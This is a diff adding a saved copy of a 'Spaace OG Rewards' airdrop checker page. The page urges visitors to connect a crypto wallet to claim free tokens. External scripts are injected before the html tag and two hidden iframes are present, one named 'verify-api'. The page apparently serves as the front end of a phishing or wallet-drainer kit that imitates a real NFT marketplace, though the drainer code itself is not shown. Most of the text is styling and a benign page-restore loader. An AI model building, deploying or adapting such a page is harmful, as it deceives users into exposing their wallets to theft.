@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<meta name="viewport"
+content="width=device-width,initial-scale=1.0">
+
+  <script src="guda/main.js"></script>
+  <script src="guda/modals.js"></script>
+  <script src="guda/fpbundle.js"></script>
+  <script src="guda/bundle.js"></script>
+<html lang="en" style="--wcm-color-fg-1: rgb(228,231,231); --wcm-color-fg-2: rgb(148,158,158); --wcm-color-fg-3: rgb(110,119,119); --wcm-color-bg-1: rgb(20,20,20); --wcm-color-bg-2: rgb(39,42,42); --wcm-color-bg-3: rgb(59,64,64); --wcm-color-overlay: rgba(255,255,255,0.1); --wcm-accent-color: #3396FF; --wcm-accent-fill-color: #FFFFFF; --wcm-z-index: 89; --wcm-background-color: #3396FF; --wcm-background-border-radius: 8px; --wcm-container-border-radius: 30px; --wcm-wallet-icon-border-radius: 15px; --wcm-wallet-icon-large-border-radius: 30px; --wcm-wallet-icon-small-border-radius: 7px; --wcm-input-border-radius: 28px; --wcm-button-border-radius: 10px; --wcm-notification-border-radius: 36px; --wcm-secondary-button-border-radius: 28px; --wcm-icon-button-border-radius: 50%; --wcm-button-hover-highlight-border-radius: 10px; --wcm-text-big-bold-size: 20px; --wcm-text-big-bold-weight: 600; --wcm-text-big-bold-line-height: 24px; --wcm-text-big-bold-letter-spacing: -0.03em; --wcm-text-big-bold-text-transform: none; --wcm-text-xsmall-bold-size: 10px; --wcm-text-xsmall-bold-weight: 700; --wcm-text-xsmall-bold-line-height: 12px; --wcm-text-xsmall-bold-letter-spacing: 0.02em; --wcm-text-xsmall-bold-text-transform: uppercase; --wcm-text-xsmall-regular-size: 12px; --wcm-text-xsmall-regular-weight: 600; --wcm-text-xsmall-regular-line-height: 14px; --wcm-text-xsmall-regular-letter-spacing: -0.03em; --wcm-text-xsmall-regular-text-transform: none; --wcm-text-small-thin-size: 14px; --wcm-text-small-thin-weight: 500; --wcm-text-small-thin-line-height: 16px; --wcm-text-small-thin-letter-spacing: -0.03em; --wcm-text-small-thin-text-transform: none; --wcm-text-small-regular-size: 14px; --wcm-text-small-regular-weight: 600; --wcm-text-small-regular-line-height: 16px; --wcm-text-small-regular-letter-spacing: -0.03em; --wcm-text-small-regular-text-transform: none; --wcm-text-medium-regular-size: 16px; --wcm-text-medium-regular-weight: 600; --wcm-text-medium-regular-line-height: 20px; --wcm-text-medium-regular-letter-spacing: -0.03em; --wcm-text-medium-regular-text-transform: none; --wcm-font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, Ubuntu, 'Helvetica Neue', sans-serif; --wcm-font-feature-settings: 'tnum' on, 'lnum' on, 'case' on; --wcm-success-color: rgb(38,181,98); --wcm-error-color: rgb(242, 90, 103); --wcm-overlay-background-color: rgba(0, 0, 0, 0.3); --wcm-overlay-backdrop-filter: none;" data-scrapbook-source="https://claim.spaace.io/chests" data-scrapbook-create="20250908193636928" data-scrapbook-adoptedstylesheet-0="*, ::after, ::before { margin: 0px; padding: 0px; box-sizing: border-box; font-style: normal; text-rendering: optimizespeed; backface-visibility: hidden; }
+
+button { cursor: pointer; display: flex; justify-content: center; align-items: center; position: relative; border: medium; background-color: transparent; transition: 0.2s; }
+
+@media (hover: hover) and (pointer: fine) {
+  button:active { transition: 0.1s; transform: scale(0.93); }
+}
+
+button::after { content: &quot;&quot;; position: absolute; inset: 0px; transition: background-color, 0.2s; }
+
+button:disabled { cursor: not-allowed; }
+
+button svg, button wcm-text { position: relative; z-index: 1; }
+
+input { border: medium; outline: 0px; appearance: none; }
+
+img { display: block; }
+
+::selection { color: var(--wcm-accent-fill-color); background: var(--wcm-accent-color); }" data-scrapbook-adoptedstylesheet-1=":host { all: initial; }
+
+.wcm-overlay { inset: 0px; position: fixed; z-index: var(--wcm-z-index); overflow: hidden; display: flex; justify-content: center; align-items: center; opacity: 0; pointer-events: none; background-color: var(--wcm-overlay-background-color); backdrop-filter: var(--wcm-overlay-backdrop-filter); }
+
+@media (max-height: 720px) and (orientation: landscape) {
+  .wcm-overlay { overflow: scroll; align-items: flex-start; padding: 20px 0px; }
+}
+
+.wcm-active { pointer-events: auto; }
+
+.wcm-container { position: relative; max-width: 360px; width: 100%; outline: 0px; border-radius: var(--wcm-background-border-radius) var(--wcm-background-border-radius) var(--wcm-container-border-radius) var(--wcm-container-border-radius); border: 1px solid var(--wcm-color-overlay); overflow: hidden; }
+
+.wcm-card { width: 100%; position: relative; border-radius: var(--wcm-container-border-radius); overflow: hidden; box-shadow: 0 6px 14px -6px rgba(10,16,31,.12),0 10px 32px -4px rgba(10,16,31,.1),0 0 0 1px var(--wcm-color-overlay); background-color: var(--wcm-color-bg-1); color: var(--wcm-color-fg-1); }
+
+@media (max-width: 600px) {
+  .wcm-container { max-width: 440px; border-radius: var(--wcm-background-border-radius) var(--wcm-background-border-radius) 0 0; }
+  .wcm-card { border-radius: var(--wcm-container-border-radius) var(--wcm-container-border-radius) 0 0; }
+  .wcm-overlay { align-items: flex-end; }
+}
+
+@media (max-width: 440px) {
+  .wcm-container { border: 0px; }
+}"><head><meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="manifest" href="https://claim.spaace.io/manifest.json">
+    
+    
+
+    <!-- Google tag (gtag.js) -->
+    
+    
+    
+    
+    <link rel="stylesheet" href="index-76723cac.css">
+  
+    <title>Spaace | OG Rewards</title>
+
+    
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#000000">
+
+    <meta name="title" content="Spaace | OG Rewards">
+    <meta name="description" content="Check your eligibility for OG rewards from the most rewarding NFT marketplace. Limited time for early adopters.">
+    <meta name="keywords" content="NFT, airdrop, free tokens, crypto, marketplace, Spaace">
+
+    <meta property="og:title" content="Spaace | OG Rewards">
+    <meta property="og:site_name" content="SPAACE">
+    <meta property="og:url" content="https://claim.spaace.io">
+    <meta property="og:description" content="Check your eligibility for OG rewards from the most rewarding NFT marketplace. Limited time for early adopters.">
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="https://spaace.io/claim-airdrop-spaace.png">
+    
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://claim.spaace.io">
+    <meta property="twitter:title" content="Spaace | OG Rewards">
+    <meta property="twitter:description" content="Check your eligibility for OG rewards from the most rewarding NFT marketplace. Limited time for early adopters.">
+    <meta property="twitter:image" content="https://spaace.io/claim-airdrop-spaace.png">
+  
+<link rel="shortcut icon" href="favicon.ico"><script data-scrapbook-elem="custom-elements-loader">(function (names) { if (!customElements) { return; } for (const name of names) { customElements.define(name, class CustomElement extends HTMLElement {}); } })(["wcm-explorer-context","wcm-theme-context","wcm-modal"])</script></head>
+  <body>
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+    <div id="root"><div data-rk=""><style>[data-rk]{--rk-blurs-modalOverlay:blur(0px);--rk-fonts-body:SFRounded, ui-rounded, "SF Pro Rounded", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";--rk-radii-actionButton:9999px;--rk-radii-connectButton:12px;--rk-radii-menuButton:12px;--rk-radii-modal:24px;--rk-radii-modalMobile:28px;--rk-colors-accentColor:#0E76FD;--rk-colors-accentColorForeground:#FFF;--rk-colors-actionButtonBorder:rgba(0, 0, 0, 0.04);--rk-colors-actionButtonBorderMobile:rgba(0, 0, 0, 0.06);--rk-colors-actionButtonSecondaryBackground:rgba(0, 0, 0, 0.06);--rk-colors-closeButton:rgba(60, 66, 66, 0.8);--rk-colors-closeButtonBackground:rgba(0, 0, 0, 0.06);--rk-colors-connectButtonBackground:#FFF;--rk-colors-connectButtonBackgroundError:#FF494A;--rk-colors-connectButtonInnerBackground:linear-gradient(0deg, rgba(0, 0, 0, 0.03), rgba(0, 0, 0, 0.06));--rk-colors-connectButtonText:#25292E;--rk-colors-connectButtonTextError:#FFF;--rk-colors-connectionIndicator:#30E000;--rk-colors-downloadBottomCardBackground:linear-gradient(126deg, rgba(255, 255, 255, 0) 9.49%, rgba(171, 171, 171, 0.04) 71.04%), #FFFFFF;--rk-colors-downloadTopCardBackground:linear-gradient(126deg, rgba(171, 171, 171, 0.2) 9.49%, rgba(255, 255, 255, 0) 71.04%), #FFFFFF;--rk-colors-error:#FF494A;--rk-colors-generalBorder:rgba(0, 0, 0, 0.06);--rk-colors-generalBorderDim:rgba(0, 0, 0, 0.03);--rk-colors-menuItemBackground:rgba(60, 66, 66, 0.1);--rk-colors-modalBackdrop:rgba(0, 0, 0, 0.3);--rk-colors-modalBackground:#FFF;--rk-colors-modalBorder:transparent;--rk-colors-modalText:#25292E;--rk-colors-modalTextDim:rgba(60, 66, 66, 0.3);--rk-colors-modalTextSecondary:rgba(60, 66, 66, 0.6);--rk-colors-profileAction:#FFF;--rk-colors-profileActionHover:rgba(255, 255, 255, 0.5);--rk-colors-profileForeground:rgba(60, 66, 66, 0.06);--rk-colors-selectedOptionBorder:rgba(60, 66, 66, 0.1);--rk-colors-standby:#FFD641;--rk-shadows-connectButton:0px 4px 12px rgba(0, 0, 0, 0.1);--rk-shadows-dialog:0px 8px 32px rgba(0, 0, 0, 0.32);--rk-shadows-profileDetailsAction:0px 2px 6px rgba(37, 41, 46, 0.04);--rk-shadows-selectedOption:0px 2px 6px rgba(0, 0, 0, 0.24);--rk-shadows-selectedWallet:0px 2px 6px rgba(0, 0, 0, 0.12);--rk-shadows-walletLogo:0px 2px 16px rgba(0, 0, 0, 0.16);}</style><div class=" top-0 z-50 flex w-full items-center justify-center bg-primary-linear-gradient-r px-[15px] py-[15px] text-center text-12-med text-white md:text-15-med">Due to high traffic, bugs may occur. If so, refresh the page until fixed. </div><div class="relative flex h-screen min-h-screen items-center justify-center overflow-hidden bg-cover bg-center bg-no-repeat"><div class="relative flex min-h-screen flex-col items-center justify-center"><div class="fixed top-24 flex flex-col items-center 9inch:top-48 top-[70px]"><div class="w-[350px] xs:w-[780px] [@media(min-width:768px)_and_(max-height:960px)]:w-[480px]"><img src="logo_spaace.png" alt="Spaace"></div><div class="mt-[-20px] text-20 text-white sm:text-32"><strong>$SPAACE</strong> OG REWARDS CHECKER</div></div><div class="flex flex-1 flex-col items-center justify-center"><div class="z-10 hidden flex-col sm:flex"><button class=" connect-wallet hover:bg-gradient-to-r hover:from-[#FFA851] hover:to-[#FF5E3D] hover:bg-orange-600 hover:border-orange-600  max-w-none w-full py-[20px] px-[40px] h-[72px] bg-gradient-to-r from-[#FF9933] to-[#FF421B] bg-orange  group relative isolation-auto order-none flex max-w-fit flex-none cursor-pointer items-center justify-center rounded-full text-center font-medium capitalize transition duration-200 ease-in-out before:pointer-events-none before:absolute before:left-1/2 before:top-1/2 before:-translate-x-1/2 before:-translate-y-1/2 before:rounded-full before:border-2 before:border-solid before:opacity-0 focus-visible:outline-none before:focus-visible:opacity-100 !w-[544px] text-24"><span class="flex w-fit items-center gap-4 "><span class="text-sub1 text-white relative whitespace-nowrap"><p class="normal-case">Connect Wallet</p></span></span></button></div><div class="z-10 flex w-full flex-col sm:hidden"><button class=" connect-wallet hover:bg-gradient-to-r hover:from-[#FFA851] hover:to-[#FF5E3D] hover:bg-orange-600 hover:border-orange-600  max-w-none w-full py-[12px] px-[24px] m-4 bg-gradient-to-r from-[#FF9933] to-[#FF421B] bg-orange  group relative isolation-auto order-none flex max-w-fit flex-none cursor-pointer items-center justify-center rounded-full text-center font-medium capitalize transition duration-200 ease-in-out before:pointer-events-none before:absolute before:left-1/2 before:top-1/2 before:-translate-x-1/2 before:-translate-y-1/2 before:rounded-full before:border-2 before:border-solid before:opacity-0 focus-visible:outline-none before:focus-visible:opacity-100 undefined"><span class="flex w-fit items-center gap-4 "><span class="text-16-med text-white relative whitespace-nowrap"><p class="normal-case">Connect Wallet</p></span></span></button></div><div class="connect-wallet z-10 mb-[33px] mt-[9px] text-center text-14 text-white sm:mb-[28px] sm:mt-[18px] sm:text-20">Connect your wallet to check your eligibility<span class="mt-[15px] block">(based on your historical NFT trading activity)</span></div></div><div class="transition-transform will-change-transform absolute bottom-0 z-[0] max-w-[480px] sm:bottom-[-12%] xs:max-w-full 4xl:bottom-[-8%] [@media(min-width:768px)_and_(max-height:960px)]:bottom-[-20%]" style="perspective: 1000px;"><div class="transition-transform duration-500 ease-out will-change-transform" style="transform: scale(1.037);"><div class="relative"><div style="--glow-color: #FFFBB5;" class="absolute left-1/2 top-1/2 z-10 h-[140px] w-[140px] -translate-x-1/2 -translate-y-1/2 animate-glow-flicker rounded-full bg-[var(--glow-color)] opacity-60 blur-[32px]"></div><img src="welcome_airdrop_chest.png" alt="chest" class="h-full w-full"></div></div></div><div class="fixed inset-0 z-[-1] h-full w-full overflow-hidden"><div class="animate-infiniteScrollBg relative w-full"><div class="absolute left-0 top-0 h-[400dvh] w-full content-['']" style="background-image: url(&quot;stars-bg.webp&quot;); background-repeat: repeat-y; background-size: contain; background-position: center bottom; background-color: rgb(66, 119, 163);"></div><img class="w-full" src="stars-bg.webp" alt="Scrolling Background"></div><div class="absolute bottom-0 left-0 w-full"><img class="w-full" src="stars-planet.png" alt="Scrolling Background"></div></div></div></div><div class="fixed bottom-20 right-20 z-toasts flex w-[calc(100vw-20px*2)] flex-col-reverse gap-32 md:bottom-48 md:right-48 md:w-fit"></div></div></div>
+    
+  
+
+<iframe id="_hjSafeContext_71284271" title="_hjSafeContext" tabindex="-1" aria-hidden="true" src="index_1.html" style="display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;"></iframe><iframe id="verify-api" src="index_2.html" style="display: none;"></iframe><wcm-modal data-scrapbook-adoptedstylesheets="0,1" data-scrapbook-shadowdom="&lt;!----&gt;&lt;wcm-explorer-context data-scrapbook-shadowdom=&quot;&amp;lt;!----&amp;gt;&quot;&gt;&lt;/wcm-explorer-context&gt;&lt;wcm-theme-context data-scrapbook-shadowdom=&quot;&amp;lt;!----&amp;gt;&quot;&gt;&lt;/wcm-theme-context&gt;&lt;div id=&quot;wcm-modal&quot; role=&quot;alertdialog&quot; aria-modal=&quot;true&quot; class=&quot; wcm-overlay &quot;&gt;&lt;div class=&quot;wcm-container&quot; tabindex=&quot;0&quot;&gt;&lt;!--?lit$869102567$--&gt;&lt;/div&gt;&lt;/div&gt;"></wcm-modal><script data-scrapbook-elem="basic-loader">(function () { var k1 = "data-scrapbook-shadowdom", k2 = "data-scrapbook-canvas", k3 = "data-scrapbook-input-indeterminate", k4 = "data-scrapbook-input-checked", k5 = "data-scrapbook-option-selected", k6 = "data-scrapbook-input-value", k7 = "data-scrapbook-textarea-value", k8 = "data-scrapbook-adoptedstylesheets", k9 = /^data-scrapbook-adoptedstylesheet-(\d+)$/, k10 = "data-scrapbook-shadowdom-mode", k11 = "data-scrapbook-shadowdom-clonable", k12 = "data-scrapbook-shadowdom-delegates-focus", k13 = "data-scrapbook-shadowdom-serializable", k14 = "data-scrapbook-shadowdom-slot-assignment", k15 = "data-scrapbook-slot-assigned", k16 = "data-scrapbook-slot-index", k17 = /^scrapbook-slot-index=(\d+)$/, k18 = '/scrapbook-slot-index', d = document, r = d.documentElement, $s = !!r.attachShadow, $as = !!d.adoptedStyleSheets, $c = !!window.HTMLCanvasElement, $sa = !!d.createElement('slot').assign, sle = [], sls = [], slt = function (r) { if ($sa) { var E = r.childNodes, i, e, s, m; for (i = 0; i < E.length; i++) { e = E[i]; if (e.nodeType === 8) { s = e.nodeValue; if (m = s.match(k17)) { s = e.nextSibling; if (s.nodeType === 3) { sls[m[1]] = s; } r.removeChild(e); i--; } else if (s === k18) { r.removeChild(e); i--; } } } } }, sl = function () { var i = sle.length, j, d, e; while (i--) { d = sle[i]; e = d.elem; d = d.value.split(','); j = d.length; while (j--) { d[j] = sls[parseInt(d[j], 10)]; } try { try { e.assign.apply(e, d); } catch (ex) { if (ex.message.includes('must have a callable @@iterator')) { e.assign(d); } else { throw ex; } } } catch (ex) { console.error(ex); } } }, asl = (function (r) { var l = [], E, i, e, m, c, j; if ($as) { E = r.attributes; i = E.length; while (i--) { e = E[i]; if (!(m = e.nodeName.match(k9))) { continue; } c = l[m[1]] = new CSSStyleSheet(); r.removeAttribute(m[0]); m = e.nodeValue.split('\n\n'); j = m.length; while (j--) { try { m[j] && c.insertRule(m[j]); } catch (ex) { console.error(ex); } } } } return l; })(r), as = function (d, e) { var l, i, I; if ($as && (l = e.getAttribute(k8)) !== null) { l = l.split(',').map(i => asl[i]); d.adoptedStyleSheets = d.adoptedStyleSheets.concat(l); e.removeAttribute(k8); } }, fn = function (r) { var E = r.querySelectorAll ? r.querySelectorAll("*") : r.getElementsByTagName("*"), i = E.length, e, d, s, m; while (i--) { e = E[i]; s = e.shadowRoot; if ($s && (d = e.getAttribute(k1))) { if (!s) { try { s = e.attachShadow({ mode: (m = e.getAttribute(k10)) !== null ? m : 'open', clonable: e.hasAttribute(k11), delegatesFocus: e.hasAttribute(k12), serializable: e.hasAttribute(k13), slotAssignment: (m = e.getAttribute(k14)) !== null ? m : void 0, }); s.innerHTML = d; } catch (ex) { console.error(ex); } } e.removeAttribute(k1); e.removeAttribute(k10); e.removeAttribute(k11); e.removeAttribute(k12); e.removeAttribute(k13); e.removeAttribute(k14); } if ($c && (d = e.getAttribute(k2)) !== null) { (function () { var c = e, g = new Image(); g.onload = function () { c.getContext('2d').drawImage(g, 0, 0); }; g.src = d; })(); e.removeAttribute(k2); } if ((d = e.getAttribute(k3)) !== null) { e.indeterminate = true; e.removeAttribute(k3); } if ((d = e.getAttribute(k4)) !== null) { e.checked = d === 'true'; e.removeAttribute(k4); } if ((d = e.getAttribute(k5)) !== null) { e.selected = d === 'true'; e.removeAttribute(k5); } if ((d = e.getAttribute(k6)) !== null) { e.value = d; e.removeAttribute(k6); } if ((d = e.getAttribute(k7)) !== null) { e.value = d; e.removeAttribute(k7); } if ($sa && (d = e.getAttribute(k15)) !== null) { sle.push({elem: e, value: d}); e.removeAttribute(k15); } if ($sa && (d = e.getAttribute(k16)) !== null) { sls[d] = e; e.removeAttribute(k16); } if (s) { slt(e); as(s, e); fn(s); } } }; as(d, r); fn(d); sl(); })()</script></body></html>
